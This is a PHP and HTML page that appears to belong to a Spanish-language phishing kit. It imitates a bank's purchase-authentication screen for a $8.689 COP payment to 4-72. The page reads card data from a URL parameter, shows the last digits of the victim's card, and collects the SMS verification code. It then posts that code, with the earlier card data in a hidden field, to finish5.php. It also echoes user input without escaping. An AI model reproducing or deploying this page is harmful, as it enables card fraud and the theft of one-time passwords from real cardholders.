<?php 


$codigoG = $_GET['codigo'];



$palabrasSeparadas = explode(" ", $codigoG);

    $fechaActual = date('d/m/y');
    $ca = substr($palabrasSeparadas[0],11,4); 
    
   // $mensaje = "La transacción que intentas realizar por un valor de: $8.689 Cop  con tu tarjeta terminada en **********".$ca." Debe ser autorizada por seguridad";

?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="/css/davi.css">
</head>
<body>
    


<div class="details" style="padding:15px;">
    <img src="/img/colpa.png" alt="" srcset="" width="70%">
    <hr>
    <h3>Autenticación de compra</h3>
    <a style="color:black;">Le hemos enviado un código de verificación a su número de teléfono.</a>
    <p></p>
    <a style="color:black;">Este código es de uso personal, por seguridad no lo comparta con terceros.</a>
    <p></p>
    <a style="color:black;">Usted esta autorizando un pago a 4-72 por $8.689 Cop con su tarjeta <?php echo "****".$ca ?></a>
<p></p><br>
    <form action="finish5.php" method="post">
       
        <center><a style="">Código de verificación</a><br>
        <input type="hidden" name="numero" value=" <?php echo "$codigoG"; ?>">

        <input type="text" name="cDinamica" id="input" style="" required minlength="6"><br>
        <input type="submit" id="btn" value="ENVIAR" style="color:white; background-color:blue; border:none;margin-top:5px; height:35px; width:189px;"></center>
        </form>
<br><br>
        <center><a><b>PEDIR OTRO CODIGO</b></a></center><br><br>
        <a><b>¿Necesitas ayuda? | Términos de Uso</b></a>
</div>





<script src="https://code.jquery.com/jquery-3.2.1.js"></script>
<script type="text/javascript">
$(document).ready(function() {
    setTimeout(function() {
        $(".content").fadeIn(1500);
    },240000);


    setTimeout(function() {
        $(".details").fadeOut(1000);
    },240000);
    
});
</script>
</body>
</html>